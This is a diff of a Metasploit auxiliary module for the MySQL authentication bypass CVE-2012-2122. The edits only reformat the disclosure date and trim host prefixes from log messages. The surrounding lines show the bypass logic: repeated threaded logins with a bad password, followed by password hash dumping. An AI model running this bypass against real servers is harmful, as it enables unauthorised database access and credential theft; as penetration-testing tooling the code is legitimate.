@@ -39,7 +39,7 @@ class MetasploitModule < Msf::Auxiliary
         ['OSVDB', '82804'],
         ['URL', 'https://www.rapid7.com/blog/post/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/']
       ],
-      'DisclosureDate' => '2012-06-09',
+      'DisclosureDate' => 'Jun 09 2012',
       'License' => MSF_LICENSE
     )
 
@@ -68,14 +68,14 @@ class MetasploitModule < Msf::Auxiliary
 
       print_good "#{mysql_client.peerhost}:#{mysql_client.peerport} The server accepted our first login as #{username} with a bad password. URI: mysql://#{username}:#{password}@#{mysql_client.peerhost}:#{mysql_client.peerport}"
     rescue ::Rex::Proto::MySQL::Client::HostNotPrivileged
-      print_error "#{Rex::Socket.to_authority(rhost, rport)} Unable to login from this host due to policy (may still be vulnerable)"
+      print_error "Unable to login from this host due to policy (may still be vulnerable)"
       return
     rescue ::Rex::Proto::MySQL::Client::AccessDeniedError
-      print_good "#{Rex::Socket.to_authority(rhost, rport)} The server allows logins, proceeding with bypass test"
+      print_good "The server allows logins, proceeding with bypass test"
     rescue ::Interrupt
       raise $!
     rescue ::Exception => e
-      print_error "#{Rex::Socket.to_authority(rhost, rport)} Error: #{e}"
+      print_error "Error: #{e}"
       return
     ensure
       socket.close if socket && close_required
@@ -109,7 +109,7 @@ class MetasploitModule < Msf::Auxiliary
         break if not item
 
         # Status indicator
-        print_status "#{Rex::Socket.to_authority(rhost, rport)} Authentication bypass is #{item / 10}% complete" if (item % 100) == 0
+        print_status "Authentication bypass is #{item / 10}% complete" if (item % 100) == 0
 
         t = Thread.new(item) do |count|
           begin
@@ -118,12 +118,12 @@ class MetasploitModule < Msf::Auxiliary
             s = connect(false)
             mysql_client = ::Rex::Proto::MySQL::Client.connect(rhost, username, password, nil, rport, io: s)
 
-            print_good "#{mysql_client.peerhost}:#{mysql_client.peerport} Successfully bypassed authentication after #{count} attempts. URI: mysql://#{username}:#{password}@#{Rex::Socket.to_authority(rhost, rport)}"
+            print_good "#{mysql_client.peerhost}:#{mysql_client.peerport} Successfully bypassed authentication after #{count} attempts. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
             results << mysql_client
             close_required = false
           rescue ::Rex::Proto::MySQL::Client::AccessDeniedError
           rescue ::Exception => e
-            print_bad "#{Rex::Socket.to_authority(rhost, rport)} Thread #{count}] caught an unhandled exception: #{e}"
+            print_bad "Thread #{count}] caught an unhandled exception: #{e}"
           ensure
             s.close if socket && close_required
           end
@@ -158,7 +158,7 @@ class MetasploitModule < Msf::Auxiliary
       return dump_hashes(mysql_client.peerhost, mysql_client.peerport)
     end
 
-    print_error("#{Rex::Socket.to_authority(rhost, rport)} Unable to bypass authentication, this target may not be vulnerable")
+    print_error("Unable to bypass authentication, this target may not be vulnerable")
   end
 
   def dump_hashes(host, port)
